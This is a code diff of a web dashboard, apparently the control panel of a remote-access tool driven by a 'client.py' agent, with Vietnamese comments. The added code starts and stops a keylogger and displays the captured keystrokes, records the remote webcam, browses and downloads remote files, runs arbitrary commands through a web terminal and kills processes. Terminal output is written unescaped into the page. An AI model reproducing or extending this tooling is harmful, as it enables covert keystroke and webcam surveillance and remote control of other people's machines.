-                <button onclick="closeSettings()" class="btn btn-danger">Cancel</button>
-            </div>
+    <div id="settingsModal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.7); z-index:99; justify-content:center; align-items:center;">
+        <div class="card" style="width:350px; text-align:center;">
+            <h2>Connection</h2>
+            <input id="in-ip" placeholder="IP" style="width:100%; padding:10px; margin:10px 0; border-radius:8px; border:1px solid #555; background:#333; color:#fff;">
+            <input id="in-port" placeholder="Port" style="width:100%; padding:10px; margin:10px 0; border-radius:8px; border:1px solid #555; background:#333; color:#fff;">
+            <button onclick="saveSettings()" class="btn">Connect</button>
+            <button onclick="document.getElementById('settingsModal').style.display='none'" class="btn btn-danger">Close</button>
         </div>
     </div>
 
     <div id="toast"></div>
 
     <script>
-        // --- CÁC HÀM CŨ (THEME, TOAST...) GIỮ NGUYÊN ---
-        function toggleTheme() {
-            const body = document.body;
-            const currentTheme = body.getAttribute('data-theme');
-            if (currentTheme === 'light') {
-                body.removeAttribute('data-theme'); localStorage.setItem('theme', 'dark');
+        // --- TABS LOGIC ---
+        function showTab(id) {
+            document.querySelectorAll('.tab-content').forEach(e => e.classList.add('hidden'));
+            document.querySelectorAll('.nav-item').forEach(e => e.classList.remove('active'));
+            
+            const target = document.getElementById('tab-' + id);
+            if(target) target.classList.remove('hidden');
+            
+            const navLink = document.querySelector(`.sidebar a[href="#${id}"]`) || document.getElementById('nav-home');
+            if(navLink) navLink.classList.add('active');
+
+            document.getElementById('page-title').textContent = id.toUpperCase();
+            
+            if(id === 'files') loadFiles('.');
+            if(id === 'processes') loadProcesses();
+            if(id === 'apps') loadApps();
+        }
+
+        // --- CHART JS ---
+        const ctx = document.getElementById('sysChart').getContext('2d');
+        const sysChart = new Chart(ctx, {
+            type: 'line',
+            data: { labels: [], datasets: [{ label: 'CPU %', data: [], borderColor: '#0a84ff', tension: 0.4 }, { label: 'RAM %', data: [], borderColor: '#30d158', tension: 0.4 }] },
+            options: { responsive: true, maintainAspectRatio: false, scales: { y: { beginAtZero: true, max: 100 } } }
+        });
+
+        setInterval(() => {
+            if(!document.getElementById('tab-home').classList.contains('hidden')) {
+                fetch('/api/stats').then(r=>r.json()).then(d => {
+                    const now = new Date().toLocaleTimeString();
+                    if(sysChart.data.labels.length > 10) { sysChart.data.labels.shift(); sysChart.data.datasets[0].data.shift(); sysChart.data.datasets[1].data.shift(); }
+                    sysChart.data.labels.push(now);
+                    sysChart.data.datasets[0].data.push(d.cpu);
+                    sysChart.data.datasets[1].data.push(d.ram);
+                    sysChart.update();
+                });
+            }
+        }, 2000);
+
+        // --- WEBCAM & KEYLOGGER ---
+        function recordWebcam() {
+            const sec = document.getElementById('cam-seconds').value;
+            const indicator = document.getElementById('rec-indicator');
+            indicator.style.display = 'flex';
+            sendControl('webcam_record', null, { seconds: sec });
+            setTimeout(() => { indicator.style.display = 'none'; }, sec * 1000 + 1000);
+        }
+
+        function toggleKeylog(start) {
+            const status = document.getElementById('kl-status');
+            if (start) {
+                sendControl('keylog_start');
+                status.textContent = "RECORDING..."; status.style.color = "#ff3b30";
             } else {
-                body.setAttribute('data-theme', 'light'); localStorage.setItem('theme', 'light');
+                sendControl('keylog_stop');
+                status.textContent = "PAUSED"; status.style.color = "#f39c12";
             }
         }
-        (function() {
-            if (localStorage.getItem('theme') === 'light') document.body.setAttribute('data-theme', 'light');
-            fetch('/api/config_info').then(r=>r.json()).then(d=>{
-                const el = document.getElementById('display-ip');
-                if(el) el.textContent = `${d.ip}:${d.port}`;
-            });
-        })();
+        
+        setInterval(() => {
+            if(!document.getElementById('tab-keylogger').classList.contains('hidden')) {
+                fetch("/keylogger_data").then(r=>r.json()).then(d => {
+                    const el = document.getElementById('keylog-content');
+                    if(d.keys && d.keys !== el.textContent) {
+                        el.textContent = d.keys;
+                        el.scrollTop = el.scrollHeight;
+                    }
+                });
+            }
+        }, 1000);
 
-        function showToast(message, type = 'success') {
-            const toast = document.getElementById('toast');
-            toast.className = type;
-            toast.innerHTML = `<i class="fa-solid ${type === 'success' ? 'fa-circle-check' : 'fa-triangle-exclamation'}"></i> <span>${message}</span>`;
-            toast.style.transform = 'translateX(-50%) translateY(30px)';
-            setTimeout(() => { toast.style.transform = 'translateX(-50%) translateY(-100px)'; }, 3000);
+        // --- FILE EXPLORER ---
+        function loadFiles(path) {
+            document.getElementById('file-list').innerHTML = '<tr><td colspan="3"><div class="skeleton"></div><div class="skeleton"></div></td></tr>';
+            fetch('/api/files/list', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({path}) })
+            .then(r=>r.json()).then(d => {
+                if(d.error) return alert(d.error);
+                document.getElementById('current-path').textContent = d.current_path;
+                let html = '';
+                d.items.forEach(i => {
+                    const icon = i.type === 'folder' ? '<i class="fa-solid fa-folder file-icon"></i>' : '<i class="fa-solid fa-file file-icon"></i>';
+                    const action = i.type === 'folder' 
+                        ? `<button onclick="loadFiles('${i.path.replace(/\\/g,'\\\\')}')" class="btn" style="padding:4px 8px;">Open</button>`
+                        : `<a href="/api/files/download?path=${encodeURIComponent(i.path)}" class="btn" style="padding:4px 8px; background:#30d158;"><i class="fa-solid fa-download"></i></a>`;
+                    html += `<tr class="file-item"><td>${icon} ${i.name}</td><td>${i.size || '-'}</td><td>${action}</td></tr>`;
+                });
+                document.getElementById('file-list').innerHTML = html;
+            });
         }
 
+        // --- TERMINAL ---
+        const termIn = document.getElementById('term-in');
+        termIn.addEventListener('keypress', function (e) {
+            if (e.key === 'Enter') {
+                const cmd = termIn.value;
+                termIn.value = '';
+                document.getElementById('term-out').innerHTML += `<div><span style="color:#0a84ff">user@server:~$</span> ${cmd}</div>`;
+                fetch('/api/terminal', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({cmd}) })
+                .then(r=>r.json()).then(d => {
+                    document.getElementById('term-out').innerHTML += `<div style="color:#ccc">${d.output}</div><br>`;
+                    document.getElementById('term-out').scrollTop = document.getElementById('term-out').scrollHeight;
+                });
+            }
+        });
+
+        // --- PROCESSES ---
+        function loadProcesses() {
+            const list = document.getElementById('proc-list');
+            list.innerHTML = Array(5).fill('<tr><td colspan="5"><div class="skeleton"></div></td></tr>').join('');
+            fetch('/api/processes').then(r=>r.json()).then(data => {
+                let html = '';
+                data.forEach(p => {
+                    html += `<tr>
+                        <td style="color:var(--accent)">${p.pid}</td>
+                        <td>${p.name}</td>
+                        <td style="color:#ff3b30; font-weight:bold;">${p.cpu_percent}%</td>
+                        <td>${p.memory_percent.toFixed(1)}%</td>
+                        <td><button onclick="killProc(${p.pid})" class="btn btn-danger" style="padding:2px 8px; font-size:0.8rem;">Kill</button></td>
+                    </tr>`;
+                });
+                list.innerHTML = html;
+            });
+        }
+        function killProc(pid) {
+            if(confirm('Kill ' + pid + '?')) sendControl('kill_process', null, {pid});
+        }
+
+        // --- APPS ---
+        function loadApps() {
+             document.getElementById('app-list').innerHTML = '<div class="skeleton"></div><div class="skeleton"></div>';
+             fetch('/api/apps').then(r=>r.json()).then(apps => {
+                 let html = '';
+                 for(const [k,v] of Object.entries(apps)) {
+                     html += `<div style="display:flex; justify-content:space-between; padding:10px; border-bottom:1px solid #333;">
+                        <span>${v.name}</span>
+                        <div>
+                            <button onclick="ctrlApp('start','${k}')" class="btn" ${v.running?'disabled':''} style="background:#30d158; opacity:${v.running?0.3:1}">Start</button>
+                            <button onclick="ctrlApp('stop','${k}')" class="btn btn-danger" ${!v.running?'disabled':''} style="opacity:${!v.running?0.3:1}">Stop</button>
+                        </div>
+                     </div>`;
+                 }
+                 document.getElementById('app-list').innerHTML = html;
+             });
+        }
+        function ctrlApp(act, app) { sendControl(act, app); setTimeout(loadApps, 1500); }
+
+        // --- COMMON ---
         function sendControl(action, appKey = null, extraData = {}) {
             const payload = { action: action };
             if (appKey) payload.app = appKey;
@@ -337,132 +384,34 @@
             fetch('/control', {
                 method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload)
             }).then(r => r.json()).then(data => {
-                if (data.status === 'ok') {
-                    showToast(data.message, 'success');
-                    if (action === 'start' || action === 'stop') setTimeout(() => location.reload(), 1000);
-                } else showToast(data.message, 'error');
-            }).catch(() => showToast("Failed to send command", 'error'));
+                if (data.status === 'ok') showToast(data.message, 'success');
+                else showToast(data.message, 'error');
+            }).catch(() => showToast("Failed", 'error'));
         }
 
-        // --- CÁC HÀM KHÁC (Kill, Record...) GIỮ NGUYÊN ---
-        function killProcess(pid) {
-            if(confirm("Force quit PID " + pid + "?")) { sendControl('kill_process', null, { pid: pid }); setTimeout(() => location.reload(), 1000); }
-        }
-        function recordWebcam() {
-            const sec = document.getElementById('cam-seconds').value;
-            const indicator = document.getElementById('rec-indicator');
-            if(indicator) indicator.style.display = 'flex';
-            sendControl('webcam_record', null, { seconds: sec });
-            setTimeout(() => { if(indicator) indicator.style.display = 'none'; }, sec * 1000 + 1000);
-        }
-        function handleDisconnect() {
-            if(confirm("Close connection?")) {
-                sendControl('disconnect');
-                showDisconnectedScreen(); // Gọi màn hình chờ thủ công
-            }
-        }
-        
-        function confirmAction(action) {
-            let msg = "";
-            if (action === 'restart') msg = "Khởi động lại máy Server?";
-            else if (action === 'shutdown') msg = "Tắt nguồn máy Server?";
-            
-            if(confirm(msg)) {
-                sendControl(action);
-            }
+        function showToast(msg, type='success') {
+            const t = document.getElementById('toast');
+            t.textContent = msg;
+            t.style.transform = "translate(-50%, 30px)";
+            setTimeout(() => t.style.transform = "translate(-50%, -100px)", 3000);
         }
 
-        function openSettings() {
-            document.getElementById('settingsModal').style.display = 'flex';
-            fetch('/api/config_info').then(r=>r.json()).then(d=>{
-                document.getElementById('input-ip').value = d.ip;
-                document.getElementById('input-port').value = d.port;
-            });
-        }
-        function closeSettings() { document.getElementById('settingsModal').style.display = 'none'; }
-        
+        // --- SETTINGS & THEME ---
+        function openSettings() { document.getElementById('settingsModal').style.display='flex'; fetch('/api/config_info').then(r=>r.json()).then(d=>{ document.getElementById('in-ip').value=d.ip; document.getElementById('in-port').value=d.port; }); }
         function saveSettings() {
-            const ip = document.getElementById('input-ip').value;
-            const port = document.getElementById('input-port').value;
-            fetch('/api/configure', {
-                method: 'POST', headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ip, port})
-            }).then(r=>r.json()).then(d=>{
-                closeSettings(); showToast(d.message, 'success'); setTimeout(() => location.reload(), 1000);
-            });
+            const ip = document.getElementById('in-ip').value;
+            const port = document.getElementById('in-port').value;
+            fetch('/api/configure', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({ip, port})}).then(()=>{ document.getElementById('settingsModal').style.display='none'; location.reload(); });
         }
+        function toggleTheme() {
+            if(document.body.getAttribute('data-theme')==='light') { document.body.removeAttribute('data-theme'); localStorage.setItem('theme','dark'); }
+            else { document.body.setAttribute('data-theme','light'); localStorage.setItem('theme','light'); }
+        }
+        if(localStorage.getItem('theme')==='light') document.body.setAttribute('data-theme','light');
 
-        // ==================================================
-        // --- LOGIC MỚI: MÀN HÌNH CHỜ & TỰ ĐỘNG KẾT NỐI ---
-        // ==================================================
+        // Init
+        showTab('home');
         
-        let isOffline = false;
-        let missedPings = 0;
-
-        // Hàm hiển thị màn hình chờ "Mất kết nối"
-        function showDisconnectedScreen() {
-            if (isOffline) return; // Nếu đã hiện rồi thì thôi
-            isOffline = true;
-
-            document.body.innerHTML = `
-                <div style="
-                    display:flex; justify-content:center; align-items:center; 
-                    height:100vh; flex-direction:column; 
-                    background: #000; color: #fff; text-align:center;
-                    font-family: -apple-system, sans-serif;
-                    animation: fadeIn 0.5s;
-                ">
-                    <div style="position: relative; margin-bottom: 30px;">
-                        <i class="fa-solid fa-wifi" style="font-size: 4rem; color: #333;"></i>
-                        <div style="
-                            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
-                            border-radius: 50%; border: 2px solid #ef4444;
-                            animation: ping 1.5s cubic-bezier(0, 0, 0.2, 1) infinite;
-                            opacity: 0;
-                        "></div>
-                    </div>
-                    
-                    <h1 style="color: #ef4444; font-weight: 700; margin-bottom: 10px;">Waiting for Client...</h1>
-                    <p style="color: #888; font-size: 1.1rem;">File <code>client.py</code> đã dừng hoặc mất kết nối.</p>
-                    <p style="color: #666; font-size: 0.9rem; margin-top: 5px;">Đang thử kết nối lại...</p>
-                    
-                    <div style="margin-top: 30px; display: flex; gap: 10px;">
-                        <button onclick="location.reload()" style="
-                            padding: 10px 20px; border-radius: 12px; border: none;
-                            background: #333; color: white; cursor: pointer; font-weight: 600;
-                        ">Thử lại ngay</button>
-                    </div>
-                </div>
-                <style>
-                    @keyframes ping { 75%, 100% { transform: scale(2); opacity: 0; } }
-                    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-                </style>
-            `;
-        }
-
-        // Vòng lặp kiểm tra trạng thái (Heartbeat)
-        setInterval(() => {
-            fetch('/api/ping')
-                .then(response => {
-                    if (response.ok) {
-                        // Nếu đang ở màn hình chờ mà ping thành công -> Reload để vào lại Dashboard
-                        if (isOffline) {
-                            location.reload();
-                        }
-                        missedPings = 0; // Reset đếm lỗi
-                    } else {
-                        throw new Error("Server error");
-                    }
-                })
-                .catch(error => {
-                    missedPings++;
-                    // Nếu mất kết nối 3 lần liên tiếp (3 giây) -> Hiện màn hình chờ
-                    if (missedPings >= 3) {
-                        showDisconnectedScreen();
-                    }
-                });
-        }, 1000); // Kiểm tra mỗi giây
-
     </script>
 </body>
 </html>
